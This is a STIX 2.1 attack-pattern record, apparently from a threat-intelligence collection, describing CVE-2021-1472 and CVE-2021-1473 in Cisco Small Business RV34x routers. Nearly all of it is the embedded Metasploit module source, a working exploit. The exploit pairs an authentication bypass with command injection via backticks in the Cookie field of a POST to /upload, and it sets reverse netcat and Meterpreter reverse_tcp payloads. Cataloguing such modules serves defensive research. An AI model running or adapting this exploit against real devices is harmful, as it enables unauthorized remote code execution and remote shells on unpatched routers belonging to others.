{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--abd4cfcc-2a71-40b2-b3c3-6e0f58441f51",
    "created": "2024-08-14T17:01:55.632913Z",
    "modified": "2024-08-14T17:01:55.632917Z",
    "name": "Cisco Small Business RV Series Authentication Bypass and Command Injection",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/cisco_rv_series_authbypass_and_rce.rb",
            "external_id": "cisco_rv_series_authbypass_and_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-1472"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-1473"
        },
        {
            "source_name": "reference",
            "url": "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sb-rv-bypass-inject-Rbhgvfdx"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2021/Apr/39"
        },
        {
            "source_name": "reference",
            "url": "https://www.iot-inspector.com/blog/advisory-cisco-rv34x-authentication-bypass-remote-command-execution/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Cisco Small Business RV Series Authentication Bypass and Command Injection',\n        'Description' => %q{\n          This module exploits an authentication bypass (CVE-2021-1472) and command injection (CVE-2021-1473)\n          in the Cisco Small Business RV series of VPN/routers. The device does not adequately verify the\n          credentials in the HTTP Authorization field when requests are made to the /upload endpoint. Then\n          the upload.cgi binary will use the contents of the HTTP Cookie field as part of a `curl` request\n          aimed at an internal endpoint. The curl request is executed using `popen` and allows the attacker\n          to inject commands via the Cookie field.\n\n          A remote and unauthenticated attacker using this module is able to achieve code execution as `www-data`.\n\n          This module affects the RV340, RV340w, RV345, and RV345P using firmware versions 1.0.03.20 and below.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Takeshi Shiomitsu', # Vulnerability discovery\n          'jbaines-r7' # Metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2021-1472' ],\n          [ 'CVE', '2021-1473' ],\n          [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sb-rv-bypass-inject-Rbhgvfdx'],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2021/Apr/39' ],\n          [ 'URL', 'https://www.iot-inspector.com/blog/advisory-cisco-rv34x-authentication-bypass-remote-command-execution/' ]\n        ],\n        'DisclosureDate' => '2021-04-07',\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_ARMLE],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'Payload' => {\n                'BadChars' => '\\''\n              },\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_netcat'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_ARMLE],\n              'Type' => :linux_dropper,\n              'Payload' => {\n                'BadChars' => '\\''\n              },\n              'CmdStagerFlavor' => [ 'wget', 'curl' ],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/armle/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true,\n          'MeterpreterTryToFork' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK ]\n        }\n      )\n    )\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  # Sends the exploit. Authentication bypass is successful as long as the authorization field\n  # is present (we add a valid base64 value as well). Command injection occurs in the cookie\n  # field. Otherwise, various values need to be present in the /upload to satisfy the upload\n  # configuration logic. Randomized values to the best of our ability.\n  # @return res\n  def send_exploit(cmd)\n    options = Rex::Text.rand_text_alphanumeric(5..12)\n    destination = Rex::Text.rand_text_alphanumeric(5..12)\n    filepath = Rex::Text.rand_text_alphanumeric(5..12)\n    filename = Rex::Text.rand_text_alphanumeric(5..12)\n    filexml = Rex::Text.rand_text_alphanumeric(5..12)\n    uploadname = Rex::Text.rand_text_alphanumeric(5..12)\n    auth = Rex::Text.encode_base64(\"#{Rex::Text.rand_text_alphanumeric(5..12)}:#{Rex::Text.rand_text_alphanumeric(5..12)}\")\n\n    multipart_form = Rex::MIME::Message.new\n    multipart_form.add_part(options, nil, nil, 'form-data; name=\"option\"')\n    multipart_form.add_part(destination, nil, nil, 'form-data; name=\"destination\"')\n    multipart_form.add_part(filepath, nil, nil, 'form-data; name=\"file.path\"')\n    multipart_form.add_part(filexml, 'application/xml', nil, 'form-data; name=\"file\"; filename=\"config.xml\"')\n    multipart_form.add_part(\"#{filename}.xml\", nil, nil, 'form-data; name=\"filename\"')\n\n    # this xml data required as is\n    multipart_form.add_part('<input><fileType>configuration</fileType><source><location-url>' \\\n      'FILE://Configuration/config.xml</location-url></source><destination><config-type>' \\\n      'config-running</config-type></destination></input>', nil, nil, \"form-data; name=\\\"#{uploadname}\\\"\")\n\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/upload'),\n      'ctype' => \"multipart/form-data; boundary=#{multipart_form.bound}\",\n      'headers' => {\n        'Cookie' => \"sessionid='`#{cmd}`'\",\n        'Authorization' => auth\n      },\n      'data' => multipart_form.to_s\n    }, 10)\n  end\n\n  # The system doesn't have a good way to snag the version. This check attempts the exploit\n  # with a command that returns immediately (id) and checks that the response looks like\n  # how a vulnerable target would respond.\n  def check\n    res = send_exploit('id')\n    return CheckCode::Unknown(\"Didn't receive a response from the target.\") unless res\n    return CheckCode::Safe('The target did not respond with a 200 OK.') unless res.code == 200\n\n    if res.body.include?('\"jsonrpc\":\"2.0\"') || res.body.include?('<head><title>301 Moved Permanently</title></head>')\n      return CheckCode::Appears('The device responded to exploitation with a 200 OK.')\n    end\n\n    CheckCode::Safe('The target did not respond with an expected payload.')\n  end\n\n  def execute_command(cmd, _opts = {})\n    # parsing of the cookie field is thrown off by ;. Replacing with && works fine, but the only\n    # downside is if the payload fails then it won't clean up after itself. Oddly, device's sh\n    # required the spacing.\n    cmd = cmd.gsub(/;/, ' && ')\n    res = send_exploit(cmd)\n\n    # unix command holds the connection open. Meterpreter should not. I think this logic is fine though.\n    # If :unix_cmd gets a good check() value and then send_exploit returns with a nil response\n    # then that is a clear sign that :unix_cmd was successful\n    if target['Type'] != :unix_cmd\n      fail_with(Failure::UnexpectedReply, 'The target did not respond with a 200 OK') unless res&.code == 200\n      body_json = res.get_json_document\n      fail_with(Failure::UnexpectedReply, 'The target did not respond with a JSON body') unless body_json\n    end\n\n    print_good('Exploit successfully executed.')\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager(linemax: 120)\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2021-04-07",
    "x_mitre_platforms": [
        "linux'"
    ]
}